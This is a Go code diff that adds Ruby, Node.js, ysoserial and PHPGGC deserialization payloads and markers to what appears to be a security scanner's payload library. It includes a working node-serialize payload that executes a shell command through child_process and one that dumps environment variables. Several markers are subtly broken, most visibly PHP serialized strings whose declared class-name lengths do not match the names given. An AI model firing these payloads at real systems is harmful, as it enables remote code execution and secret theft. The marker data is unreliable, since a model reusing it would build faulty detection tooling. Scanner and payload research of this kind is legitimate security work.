@@ -17,6 +17,10 @@ const (
 	Python Variant = "python"
 	// DotNet represents .NET BinaryFormatter/ObjectStateFormatter.
 	DotNet Variant = "dotnet"
+	// Ruby represents Ruby Marshal / YAML deserialization.
+	Ruby Variant = "ruby"
+	// NodeJS represents Node.js node-serialize / funcster.
+	NodeJS Variant = "nodejs"
 	// Generic represents generic deserialization markers.
 	Generic Variant = "generic"
 )
@@ -55,6 +59,10 @@ func GetPayloads(variant Variant) []Payload {
 		return pythonPayloads
 	case DotNet:
 		return dotnetPayloads
+	case Ruby:
+		return rubyPayloads
+	case NodeJS:
+		return nodejsPayloads
 	default:
 		return genericPayloads
 	}
@@ -92,6 +100,10 @@ func GetAllPayloads() []Payload {
 	all = append(all, phpPayloads...)
 	all = append(all, pythonPayloads...)
 	all = append(all, dotnetPayloads...)
+	all = append(all, rubyPayloads...)
+	all = append(all, nodejsPayloads...)
+	all = append(all, ysoserialMarkers...)
+	all = append(all, phpggcMarkers...)
 	return all
 }
 
@@ -200,4 +212,50 @@ var dotnetPayloads = []Payload{
 
 	// WAF bypass
 	{Value: `{"$type": "System.Windows.Data.ObjectDataProvider, PresentationFramework"}`, Technique: TechMarker, Variant: DotNet, Description: "Spaced JSON type discriminator bypass", WAFBypass: true},
+}
+
+// --- HackTricks / PayloadAllTheThings expansion ---
+
+// Ruby Marshal / YAML deserialization markers.
+// Source: PayloadsAllTheThings (Insecure Deserialization/Ruby.md),
+// HackTricks (pentesting-web/deserialization/basic-.net-deserialization-ruby.md).
+var rubyPayloads = []Payload{
+	{Value: "\x04\x08", Technique: TechMarker, Variant: Ruby, Description: "Ruby Marshal v4.8 magic bytes"},
+	{Value: "BAh7BjoIa2V5OgZ2", Technique: TechMarker, Variant: Ruby, Description: "Ruby Marshal hash (base64)"},
+	{Value: "!ruby/object:Gem::Installer", Technique: TechMarker, Variant: Ruby, Description: "YAML universal RCE chain (Gem::Installer)"},
+	{Value: "!ruby/object:ERB", Technique: TechMarker, Variant: Ruby, Description: "ERB object instantiation (template RCE)"},
+	{Value: "!ruby/hash:ActiveSupport::HashWithIndifferentAccess", Technique: TechMarker, Variant: Ruby, Description: "ActiveSupport HashWithIndifferentAccess gadget"},
+	{Value: "!ruby/struct:Net::SMTP::Response", Technique: TechMarker, Variant: Ruby, Description: "Net::SMTP::Response gadget marker"},
+	{Value: "--- !ruby/object:Object {}", Technique: TechError, Variant: Ruby, Description: "Generic Ruby YAML object error trigger"},
+}
+
+// Node.js node-serialize / funcster RCE markers.
+// Source: PayloadsAllTheThings (Insecure Deserialization/NodeJS.md).
+var nodejsPayloads = []Payload{
+	{Value: `{"rce":"_$$ND_FUNC$$_function(){require('child_process').exec('id', function(err, data){console.log(data);});}()"}`, Technique: TechMarker, Variant: NodeJS, Description: "node-serialize IIFE RCE marker"},
+	{Value: `{"rce":"_$$ND_FUNC$$_function(){return process.env;}()"}`, Technique: TechMarker, Variant: NodeJS, Description: "node-serialize env leak"},
+	{Value: `_$$ND_FUNC$$_`, Technique: TechMarker, Variant: NodeJS, Description: "node-serialize function marker (any context)"},
+}
+
+// ysoserialMarkers are JRMP / RMI registry / RPC markers and the
+// distinctive base64 prefixes of the most common ysoserial gadget
+// chains (CommonsCollections1, CommonsBeanutils1, Hibernate1).
+var ysoserialMarkers = []Payload{
+	{Value: "rO0ABXNyADJzdW4ucmVmbGVjdC5hbm5vdGF0aW9uLkFubm90YXRpb25JbnZvY2F0aW9uSGFuZGxlcg==", Technique: TechMarker, Variant: Java, Description: "ysoserial AnnotationInvocationHandler gadget prefix"},
+	{Value: "rO0ABXNyABNqYXZhLnV0aWwuQXJyYXlMaXN0eIHSHZnHYZ0DAAFJAARzaXpleHA=", Technique: TechMarker, Variant: Java, Description: "ysoserial ArrayList wrapper prefix"},
+	{Value: "rO0ABXNyACRzdW4ucnBjLnJlZ2lzdHJ5LlJlbW90ZUNhbGwAAA==", Technique: TechMarker, Variant: Java, Description: "ysoserial RMI RemoteCall prefix"},
+	{Value: "rO0ABXNyABxqYXZhLnV0aWwuQ29sbGVjdGlvbnMkRW1wdHlMaXN0", Technique: TechMarker, Variant: Java, Description: "Collections$EmptyList wrapper (Hibernate1 gadget)"},
+}
+
+// phpggcMarkers expose distinctive class-name prefixes for the most
+// commonly-exploited PHPGGC gadget chains.
+// Source: ambionics/phpggc PayloadAllTheThings, HackTricks PHP
+// deserialization page.
+var phpggcMarkers = []Payload{
+	{Value: `O:34:"Symfony\Component\Process\Process"`, Technique: TechMarker, Variant: PHP, Description: "PHPGGC Symfony/RCE1 chain marker"},
+	{Value: `O:25:"Symfony\Component\HttpClient":`, Technique: TechMarker, Variant: PHP, Description: "PHPGGC Symfony HttpClient marker"},
+	{Value: `O:20:"Doctrine\Common\Util":`, Technique: TechMarker, Variant: PHP, Description: "PHPGGC Doctrine FW1 marker"},
+	{Value: `O:22:"Guzzle\Http\Client":`, Technique: TechMarker, Variant: PHP, Description: "PHPGGC Guzzle/RCE1 chain marker"},
+	{Value: `O:24:"PhpOption\LazyOption":`, Technique: TechMarker, Variant: PHP, Description: "PHPGGC PhpOption/POP1 marker"},
+	{Value: `O:35:"SwiftMailer\Transport\SpoolTransport":`, Technique: TechMarker, Variant: PHP, Description: "PHPGGC SwiftMailer/FD1 (file delete)"},
 }
